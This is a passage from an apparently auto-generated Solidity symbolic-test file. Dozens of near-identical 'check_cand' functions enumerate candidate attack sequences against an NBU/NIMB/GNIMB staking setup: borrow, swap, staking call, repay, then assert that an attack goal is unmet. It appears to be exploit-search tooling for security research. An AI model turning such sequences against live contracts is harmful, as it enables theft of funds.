        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3376(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3377(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3378(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3379(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3380(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3381(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3382(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3383(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3384(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3385(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3386(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3387(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3388(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3389(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3390(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3391(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3392(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3393(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3394(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3395(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3396(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3397(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3398(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3399(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3400(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3401(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3402(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3403(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3404(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3405(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3406(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3407(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3408(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3409(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3410(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3411(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3412(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3413(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3414(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3415(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3416(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3417(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3418(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3419(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3420(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3421(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
